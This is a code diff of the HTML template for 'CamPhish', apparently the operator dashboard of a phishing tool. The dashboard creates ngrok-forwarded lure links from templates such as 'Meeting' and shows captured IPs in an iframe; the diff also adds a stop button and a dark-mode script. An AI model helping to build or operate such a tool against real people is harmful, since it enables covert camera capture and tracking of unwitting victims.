@@ -2,6 +2,7 @@
 
 {% block head %}
     <link rel="stylesheet" href="{{ url_for('static', filename='css/Camphish.css') }}">
+    <script src="{{ url_for('static', filename='js/form.js') }}"></script>
     <title>CamPhish</title>
 {% endblock %}
 
@@ -9,14 +10,15 @@
 
 {% block body %}
     <div id="content">
-        <form action="/CamPhish" method="post">
+        <form id="ngrok_ip_get">
             <hr>
-            <label for="port_forwarding">Service for port forwarding</label>
-            <br>
-            <select name="port_forwarding" id="port_forwarding">
-                <option value="1" id="ngrok">Ngrok</option>
-                <option value="2" id="serveo" disabled>Serveo.net | Not yet implemented</option>
-            </select>
+            <div class="filter-descr">
+                <span class="filter-title">Service for port forwarding</span><br>
+                <SELECT size=1 name="port_forwarding" id="port_forwarding">
+                    <OPTION value="1" id="ngrok">NGROK</OPTION>
+                    <OPTION value="2" id="serveo" disabled>Serveo.net | Not yet implemented</OPTION>
+                </SELECT>
+            </div>
             <hr>
 
             <label for="template" id="templatelabel">Select your Template</label><br>
@@ -25,15 +27,71 @@
                 <option value="2" id="youtube" disabled>Youtube | Not yet implemented</option>
                 <option value="3" id="meeting">Meeting</option>
             </select>
+
+
             <hr>
             <input type="submit" value="Create Link" id="submit">
         </form>
-    {% if ngrok_url != None%}
-        <p>Your Camphish Url: <a href="{{ ngrok_url }}"> {{ ngrok_url }}</a></p>
-    {% endif %}
+        <form action="/stop_camphish" method="post" id="stop_camphish">
+                <input name="stop_ngrok" type="submit" id="stop_ngrok" value="STOP">
+                <script>
+                    $(document).ready(function () {
+                        $('#stop_camphish').hide()
+                    });
+                </script>
+        </form>
+        <label id="ngrok_url"></label>
     </div>
 
     <iframe id="ips" src="/ips" style="border: none; width: available">
     </iframe>
+        <script>
+            (function() {
+                // Was soll passieren, wenn anhand das ID das Element dokumentiert ist
+                var switchToDark = document.getElementById("switchToDark");
+                if (switchToDark) {
+                    initTheme();
+                    switchToDark.addEventListener("change", function(event) {
+                        resetTheme();
+                    });
+
+                    function initBlack() {
+                        $('#logo_img').attr("src", "https://raw.githubusercontent.com/DiscoveryFox/Charlie-s-Fourth-Angel/master/favicon_white.png");
+                    }
+                    // Was soll drin passieren, wenn das Schalter geklickt ist
+                    // Das localStorage speichert die Daten ohne Ablaufdatum. Das heißt, wenn du auf Dark Mode die Seite verlassen hast, dann wird die Dark Mode nicht weg und bleibt, sobald du das auf Light Mode zurücksetzt. Die Daten werden beim Schließen des Browsers nicht gelöscht und stehen am nächsten Tag, in der nächsten Woche oder im nächsten Jahr zur Verfügung.
+                    function initTheme() {
+                        var darkThemeClick =
+                            localStorage.getItem("switchToDark") !== null &&
+                            localStorage.getItem("switchToDark") === "dark";
+                        switchToDark.checked = darkThemeClick;
+                        darkThemeClick
+                            ?
+                            document.body.setAttribute("theme", "dark"):
+                            document.body.removeAttribute("theme");
+                        darkThemeClick
+                            ?
+                            initBlack():
+                            null
+                    }
+                    // Was soll zurückgesetzt werden, wenn unserer Schalter nicht mehr geprüft ist bzw. wenn man es nochmal geklickt hat.
+                    function resetTheme() {
+                        if (switchToDark.checked) {
+                            document.body.setAttribute("theme", "dark");
+                            localStorage.setItem("switchToDark", "dark");
+                            document.getElementById("spanChange").innerHTML = "Dark Mode";
+                            $('#logo_img').attr("src", "https://raw.githubusercontent.com/DiscoveryFox/Charlie-s-Fourth-Angel/master/favicon_light.png");
+                        } else {
+                            document.body.removeAttribute("theme");
+                            localStorage.removeItem("switchToDark");
+                            document.getElementById("spanChange").innerHTML = "Light Mode";
+                            $('#logo_img').attr("src", "https://raw.githubusercontent.com/DiscoveryFox/Charlie-s-Fourth-Angel/master/favicon_dark.png");
+                        }
+                    }
+                }
+            })();
+        </script>
 {% endblock %}
+
+
 
